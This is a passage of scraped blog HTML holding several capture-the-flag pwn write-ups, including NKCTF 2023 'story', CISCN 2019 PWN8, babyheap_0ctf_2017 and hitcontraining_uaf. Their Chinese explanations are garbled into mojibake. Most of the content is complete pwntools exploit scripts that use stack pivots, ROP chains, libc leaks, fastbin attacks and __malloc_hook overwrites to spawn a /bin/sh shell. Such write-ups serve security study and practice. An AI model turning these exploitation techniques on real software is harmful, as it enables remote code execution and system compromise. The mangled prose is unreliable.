# comentropy.cn
# 8301 8302 8303 8304
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;story&#34;&gt;story&lt;/h4&gt;
&lt;p&gt;64‰ΩçÊ†àËøÅÁßª&lt;br&gt;
menuÂ≠òÂú®4‰∏™ÂáΩÊï∞ÔºåÂâç‰∏â‰∏™ÂáΩÊï∞ÂêëbssÊÆµÂàÜÂà´ÂÜôÂÖ•8bytes&lt;br&gt;
Á¨¨Âõõ‰∏™ÂáΩÊï∞Âú®Ââç‰∏â‰∏™ÂáΩÊï∞ÈÉΩË¢´Ë∞ÉÁî®ÂêéÊâßË°åÔºåÈÄöËøáread()ËØªÂÖ•0x20bytes&lt;br&gt;
Ââç‰∏âÊ¨°Èöè‰æøËØªÂÖ•ÔºåÊ≠§È¢òÂèØ‰ª•ÈÄöËøáÁ¨¨ÂõõÊ¨°ÂáΩÊï∞ÊâßË°åÊó∂ËøõË°å‰∏§Ê¨°Ê†àËøÅÁßª‰πãÂêéÂä´ÊåÅrspÂØÑÂ≠òÂô®ÁÑ∂ÂêéÊûÑÂª∫ROPÈìæÊ≥ÑÈú≤libcËøîÂõûÊûÑÈÄ†ÊàñËÄÖone_gadgetÊ±ÇËß£&lt;br&gt;
Ê†àËøÅÁßªÂêéÁî±‰∫éreadÈïøÂ∫¶ÈôêÂà∂0x20ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂ∞èÂøÉÊûÑÂª∫ROPÈìæ&lt;br&gt;
Âè¶Â§ñÊ≥®ÊÑè‰∏ÄÁÇπÔºåÊ≠§È¢òÈúÄÁïôÊÑè&lt;a href=&#34;http://blog.binpang.me/2019/07/12/stack-alignment/&#34;&gt;ÂçÅÂÖ≠Â≠óËäÇÂØπÈΩê&lt;/a&gt;ÁöÑÈóÆÈ¢òÔºåÂ¶ÇÊûúÊúÄÂêéÂç°‰Ωè‰∫Ü‰∏çÂ¶®‰øÆÊîπ‰∏Ä‰∏ãbssÁöÑÂàùÂßãÂú∞ÂùÄÔºàÂç°‰∫Ü2hÁöÑÈîÖ&lt;/p&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./story&amp;quot;)
io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,35198)
elf=ELF(&amp;quot;./story&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
heart=0x40136f
ret=0x40101a
bss_addr=0x4050A8+0x700
pop_rdi_ret=0x401573
read_text=0x401387
leave_ret=0x40139e
one_gadget=[0xe3afe,0xe3b01,0xe3b04]

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;comment?\n&amp;quot;)
# payload=p64(read_text)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.recvuntil(b&amp;quot;corment?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
io.recvuntil(b&amp;quot;corMenT?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;4&amp;quot;)
io.recvuntil(b&amp;quot;heart...\n&amp;quot;)




payload=cyclic(0xA)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x8)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(heart)
io.send(payload)

libc_base=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x084420
sys_addr=libc_base+0x052290
str_bin_sh=libc_base+0x1b45bd
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

shell=one_gadget[0]+libc_base
print(&amp;quot;shell:  &amp;quot;+hex(shell))


# gdb.attach(io)
# pause()

# payload=cyclic(0x12)+p64(shell)
# # payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
# io.send(payload)

io.recvuntil(b&amp;quot;heart...\n&amp;quot;)

payload=cyclic(0xA)+p64(bss_addr+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040139e : leave ; ret
# 0x000000000040156c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401570 : pop r14 ; pop r15 ; ret
# 0x0000000000401572 : pop r15 ; ret
# 0x000000000040156b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040118d : pop rbp ; ret
# 0x0000000000401573 : pop rdi ; ret
# 0x0000000000401571 : pop rsi ; pop r15 ; ret
# 0x000000000040156d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">NKCTF_2023 pwnÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9c1-_YzDp/"" data-c="
          &lt;p&gt;ÈùôÊÄÅÁºñËØëÈ¢òÁõÆÔºå0x50Âà∞ret&lt;br&gt;
ÈíàÂØπËæìÂÖ•Êï∞ÊçÆÂºÇÊàñ0x66ÔºåÂÜçÂºÇÊàñ‰∏ÄÊ¨°Â§çÂéü&lt;br&gt;
ropchain‰∏ÄÊääÊ¢≠&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from struct import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./p8&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28093)

io.recvuntil(b&amp;quot;Password: \n&amp;quot;)
def rop():
    p = b&#39;&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += b&#39;/bin//sh&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += p64(0x3b)
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
    return p

tmp=rop()

payload=&#39;a&#39;*0x50

tt=&#39;&#39;

for i in tmp:
    tt+=chr(i^0x66)
payload+=tt
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[CISCN 2019ÂçéÂçó]PWN8 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/4WTMScs9z/"" data-c="
          &lt;p&gt;Êú¨È¢ò64‰Ωç‰øùÊä§ÂÖ®ÂºÄÔºåËÄÉÂØüfastbin attackÂíåunsorted bin leak„ÄÅchunk extendÁ≠âÁ≠âÔºåÊ≥®ÊÑèÈúÄË¶Åpatchelf&lt;br&gt;
‰∏ªÂáΩÊï∞‰∏≠menuÂèØ‰ª•Â§ßÊ¶ÇÊ¶ÇÊã¨Ê≠§È¢òÊâÄÁî®Âà∞ÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679552396568.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
1.allocateÔºö&lt;br&gt;
ÊåâidxÈ°∫Â∫èÂàÜÈÖçÂ†ÜÂùóÔºåÂÖ∂‰∏≠ÂèØ‰ª•Ëá™Â∑±ÊåáÂÆösizeÔºåÊúÄÂ§ß4096ÔºåÂπ∂‰∏îÂàÜÈÖçÊó∂‰ΩøÁî®ÁöÑÊó∂calloc()ÂáΩÊï∞ÔºåÂàÜÈÖçÂêé‰ºöÁªôcontentËµã0&lt;br&gt;
2.fill:&lt;br&gt;
Ëá™Â∑±ÊåáÂÆösizeÂíåcontentÔºåÊ≠§Â§ÑÂèØ‰ª•ÈÄ†ÊàêÂ†ÜÊ∫¢Âá∫&lt;br&gt;
3.free&lt;br&gt;
ÈáäÊîæÊåáÂÆöidxÁöÑÂ†ÜÂùóÁöÑÂÜÖÂÆπÔºåÊåáÈíàÁΩÆÈõ∂ÔºåÊïÖ‰∏çÂ≠òÂú®uaf&lt;br&gt;
4.dump&lt;br&gt;
ÊâìÂç∞Âá∫ÊåáÂÆöidxÁöÑÂ†ÜÂùóÁöÑcontent&lt;br&gt;
ÊïÖÂèØ‰ª•ËÄÉËôëÊ≥ÑÈú≤bin[0]ÂêéÊ†πÊçÆÂÅèÁßªËÆ°ÁÆóÂá∫libcÂü∫ÂùÄÂà©Áî®one_gadgetÊ±ÇËß£Ê≠§È¢òÔºõ&lt;br&gt;
Â†Ü‰∏äÊ≥ÑÈú≤‰ΩøÁî®ÁöÑÊòØunsorted bin leakÔºåunsorted bin‰ΩøÁî®ÂèåÂêëÈìæË°®ËøõË°åÁÆ°ÁêÜÔºå‰ΩøÁî®fdÂíåbkÊåáÈíàÔºåËØ¥ÊòéËßÅctf-wiki&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553089112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679553188030.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
È¶ñÂÖàÊàë‰ª¨ÂèØ‰ª•ÂàÜÈÖç4‰∏™fast chunk(idx=0„ÄÅ1„ÄÅ2„ÄÅ3)Ôºå1‰∏™small chunk(idx=4)&lt;br&gt;
ÂÖàfreeÊéâchunk 1Âíåchunk 2&lt;br&gt;
Ê≠§Êó∂&lt;code&gt;main_arena-&amp;gt;chunk 2-&amp;gt;chunk 1&amp;lt;-0x0&lt;/code&gt;&lt;br&gt;
ÂêéÈÄöËøáÂ†ÜÊ∫¢Âá∫Â∞Üchunk 2ÁöÑfdÊåáÈíàË¶ÜÁõñ‰∏∫chunk 4ÁöÑÂú∞ÂùÄÔºå‰ª•‰æøÂêéÁª≠dumpÂá∫leak_addr&lt;br&gt;
ÈÄöËøáÂ†ÜÊ∫¢Âá∫Â∞Üchunk 4ÁöÑsize‰øÆÊîπÁ¨¶Âêàfast binÁöÑÂ§ßÂ∞è&lt;br&gt;
Êé•ÁùÄÈÄöËøá‰∏§Ê¨°alloc(0x10)Â∞Üchunk 2Âíåchunk 4ÈáçÊñ∞ÂàÜÈÖçÂõûÂéªÔºåÊ≠§Êó∂chunk 2Âíåchunk 4ÊåáÂêëÂÜÖÂ≠ò‰∏≠Âêå‰∏ÄÂùóÂå∫Âüü&lt;br&gt;
ÁÑ∂ÂêéÊàë‰ª¨ÂÜçÊ¨°ÈÄöËøáÂ†ÜÊ∫¢Âá∫Â∞Üchunk 4ÁöÑÂ†ÜÂùóÂ§ßÂ∞èÊîπÂõûÂéªÔºåÊîπ‰∏∫small chunkÂ§ßÂ∞è&lt;br&gt;
Êé•ÁùÄÊàë‰ª¨ÂÜçÁî≥ËØ∑‰∏ÄÂùósmall chunkÔºåÈò≤Ê≠¢free(4)Âêéchunk 4Âíåtop chunkÂêàÂπ∂&lt;br&gt;
ÁÑ∂Âêéfree(4)Âêéchunk 4Ë¢´ÂàíÂà∞unsorted bin‰∏≠ÔºåfdÂíåbkÊåáÂêëmain_arenaÁöÑ‰∏ÄÂùóÂÅèÁßªÂú∞ÂùÄÂ§Ñ(‰∏çÊòØmain_arenaÂú∞ÂùÄ)&lt;br&gt;
Ê≠§Êó∂ÂèØ‰ª•dumpÂá∫ËøôÂùóÂÅèÁßªÂú∞ÂùÄ&lt;br&gt;
ÂèØ‰ª•ÁÆóÂá∫ËØ•Âú∞ÂùÄË∑ùÁ¶ªmain_arenaÂÅèÁßª‰∏∫0x58&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679557961646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁÑ∂ÂêéÊ†πÊçÆmalloc_trim‰∏≠main_arenaÁöÑÂÅèÁßªÁÆóÂá∫libcÁöÑÂü∫ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679559052671.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ëé∑ÂèñlibcÂü∫ÂùÄÂêéÊàë‰ª¨ÂèØ‰ª•Âä´ÊåÅ__malloc_hook&lt;br&gt;
ÂéüÁêÜÊòØÂú®Ë∞ÉÁî®mallocÊàñËÄÖfreeÁöÑÊó∂ÂÄôÔºåÂ¶ÇÊûú malloc_hook Âíåfree_hookÁöÑÂÄºÂ≠òÂú®ÔºåÂàô‰ºöË∞ÉÁî®malloc_hookÊàñËÄÖfree_hookÊåáÂêëÁöÑÂú∞ÂùÄÔºåÂÅáËÆæÂú®‰ΩøÁî®one_gadgetÁöÑÊó∂ÂÄôÊª°Ë∂≥one_gadgetÁöÑË∞ÉÁî®Êù°‰ª∂ÔºåÂΩìoverwrite malloc_hookÂíåfree_hookÁöÑÊó∂ÂÄôÔºå‰æøÂèØ‰ª•getshellÔºåÊâßË°åmallocÁöÑÊó∂ÂÄôÔºåÂÖ∂ÂèÇÊï∞ÊòØsizeÂ§ßÂ∞èÔºåÊâÄ‰ª•overwrite malloc_hookÁöÑÊó∂ÂÄô‰ΩøÁî®one_gadgetÁöÑÂú∞ÂùÄÂèØ‰ª•getshell„ÄÇÊâßË°åfreeÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•Â∞Ü__free_hookÁöÑÂÄºoverwrite‰∏∫systemÁöÑÂú∞ÂùÄÔºåÈÄöËøáÈáäÊîæ(/bin/sh\x00)ÁöÑchunkÔºåÂèØ‰ª•ËææÂà∞system(/bin/sh)Êù•getshell&lt;br&gt;
ÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶Å‰∏ÄÂùómalloc_hookÈôÑËøëÁöÑfake_chunkÔºå‰ΩøÂÖ∂ËøõÂÖ•fast binÔºåÂÜçÂ∞ÜÂÖ∂Áî≥ËØ∑Âá∫Êù•ÔºåÈÄöËøáfill()ÂèØ‰ª•Â∞Ümalloc_hook‰øÆÊîπ‰∏∫one_gadget&lt;br&gt;
ÊúÄÂêé‰ªéchunk 4Ôºàunsorted bin‰∏≠ÔºâÁî≥ËØ∑‰∏ÄÂùófast chunkÂá∫Êù•ÔºåfreeÊéâËøõÂÖ•fast binÔºåÁÑ∂ÂêéÈÄöËøá‰øÆÊîπchunk 2ÂèØ‰ª•‰øÆÊîπchunk 4ÁöÑfdÂà∞fake_chunkÔºåÊúÄÂêéÂàÜÈÖçfake_chunkÔºåfill(6) Âç≥chunk 6Êù•getshell&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26939)
elf=ELF(&amp;quot;./babyheap_0ctf_2017&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
main_arena_off=0x3C4B20
fake_chunk_off=0x3c4aed

def alloc(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(n))

def fill(n,s,m):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Size: &amp;quot;)
    io.sendline(str(s))
    io.recvuntil(b&amp;quot;Content: &amp;quot;)
    io.send(m)

def free(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))

def dump(n):
    io.recvuntil(b&amp;quot;Command: &amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;Index: &amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content: \n&amp;quot;)


alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

free(1)
free(2)

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)


payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x21)
fill(3,len(payload),payload)


alloc(0x10)  #allocate chunk2
alloc(0x10) #allocate chunk4

payload=b&amp;quot;a&amp;quot;*16+p64(0)+p64(0x91)
fill(3,len(payload),payload)

alloc(0x80)
free(4)

gdb.attach(io)
pause()

dump(2)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
libc_addr=leak_addr-main_arena_off-0x58
fake_chunk=libc_addr+fake_chunk_off
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=one_gadget[1]+libc_addr
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;fake_chunk:  &amp;quot;+hex(fake_chunk))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;shell:  &amp;quot;+hex(shell))





alloc(0x60) #fast chunk
free(4) #into fast bin
payload=p64(fake_chunk)
fill(2,len(payload),payload)


alloc(0x60) #chunk 4
alloc(0x60) #chunk 6
payload=cyclic(0x13)+p64(shell)
fill(6,len(payload),payload)
alloc(0x100)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">babyheap_0ctf_2017 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xKSRkZlGH/"" data-c="
          &lt;p&gt;‰∏ÄÈÅì32‰ΩçÂ†ÜÈ¢òÔºåÂºÄÂêØnx‰øùÊä§ÔºåfreeÂêéÊåáÈíàÊú™ÁΩÆnullÂ≠òÂú®uafÊºèÊ¥û&lt;br&gt;
ida‰∏ªÂáΩÊï∞&lt;img src=&#34;https://oraclepi.tech/post-images/1679384000551.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
menu‰∏≠ÂèØ‰ª•ÁúãÂá∫Â≠òÂú®add_noteÔºådel_noteÔºåprintf_note‰∏â‰∏™‰∏ªË¶ÅÂáΩÊï∞&lt;br&gt;
ËøõÂÖ•Âà∞add_noteÈáåÈù¢ÂèØ‰ª•ÂèëÁé∞ÊØèÊ¨°addÊó∂Áªô‰∫åÁª¥ÊåáÈíàÊï∞ÁªÑnotelistÂàÜÈÖç‰∫Ü8bytesÁ©∫Èó¥&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384185720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
print_noteÂèØ‰ª•ÊâßË°å*(notelist[v2])(notelist[v2])Â§ÑÁöÑÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384273443.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄåÈÄ†ÊàêÊºèÊ¥ûÁöÑdel_noteÂáΩÊï∞‰∏≠free&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679384215187.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄånotelistÁöÑÂâçÂõõ‰∏™Â≠óËäÇÁª¥Êä§È¶ñÂú∞ÂùÄÔºåÂêéÂõõ‰∏™Â≠óËäÇÁª¥Êä§ÂÜÖÂÆπ&lt;br&gt;
‰∫éÊòØÊàë‰ª¨ÂÖàadd_note‰∏§Ê¨°ÔºåÂÜç‰æùÊ¨°del_note‰πãÂêéÔºåÊúÄÂêé‰∏ÄÊ¨°add_noteÊó∂Â∞ÜsizeËÆæ‰∏∫8‰øùËØÅbest fitÂéüÂàôÂàÜÈÖçÂà∞ÊúÄÂàùfreeÁöÑchunk‰∏≠ÔºåÊúÄÂêéprint_noteËé∑Âèñshell&lt;br&gt;
gdbË∞ÉËØïÂèëÁé∞ÊúÄÂêécall eaxÊó∂ÊâßË°å0x9f451a0Â§ÑÂ°´ÂÖÖÁöÑÂú∞ÂùÄÊåáÂêëÁöÑÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679386515982.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./hacknote&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25546)
back_door=0x8048945

def add(n,st):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)
    io.recvuntil(b&amp;quot;size :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;Content :&amp;quot;)
    io.send(st)

def delete(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

def printw(n):
    io.recvuntil(b&amp;quot;choice :&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;Index :&amp;quot;)
    io.sendline(str(n))

add(24,cyclic(0x18))
add(24,cyclic(0x18))
delete(0)
delete(1)
gdb.attach(io)
pause()
add(8,p32(back_door))
printw(0)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">hitcontraining_uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/M53rCmTPP/"" data-c="
          &lt;p&gt;64‰ΩçÂºÄÂêØnx‰øùÊä§ÁöÑÊ†àËøÅÁßªÈ¢òÁõÆ&lt;br&gt;
ida‰∏ªÂáΩÊï∞ÔºåÂèØ‰ª•ÁúãÂá∫Âè™Êúâ‰∏ÄÊ¨°Ê∫¢Âá∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679066891201.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ËøÅÁßªÊ†àÂà∞bssÊÆµ‰∏äÔºåË∞ÉÁî®readËøõË°åÂ∏ÉÊ†àÊìç‰ΩúÔºåÊ≥ÑÈú≤libcÂü∫ÂùÄÔºåÊ≥®ÊÑèËæìÂÖ•Ë∑ùÁ¶ªrbp‰∏∫0x60ÔºåÊØèÊ¨°ËøÅÁßªÈÉΩÈúÄË¶ÅËÄÉËôëÂÅèÁßª&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Á¨¨‰∫åÊ¨°ËøÅÁßªÊûÑÈÄ†Ëé∑ÂèñshellÔºå‰πüÂèØ‰ª•‰∏çËøÅÁßªÁõ¥Êé•Êâìone_gadget&lt;br&gt;
ËøÅÁßªÊ≥®ÊÑèÂÅèÁßªÈáèÔºåËøôÈáå&lt;code&gt;-0xa8&lt;/code&gt;ÊàëÊòØgdbÊâãË∞ÉÂá∫Êù•ÁöÑÔºåü•π&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÆåÊï¥expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./pwn1&amp;quot;)
# io=remote(&amp;quot;1.13.251.106&amp;quot;,8005)
elf=ELF(&amp;quot;./pwn1&amp;quot;)
libc=ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
bss_addr=0x404040+0x700
pop_rdi_ret=0x401283
leave_ret=0x401214
read_text=0x4011FD
main=0x4011db

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x60)+p64(bss_addr)+p64(read_text)
io.send(payload)

payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0x60)+p64(leave_ret)

io.send(payload)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x60,b&amp;quot;a&amp;quot;)+p64(bss_addr-0xa8)+p64(leave_ret)
io.sendline(payload)


io.interactive()

# Gadgets information
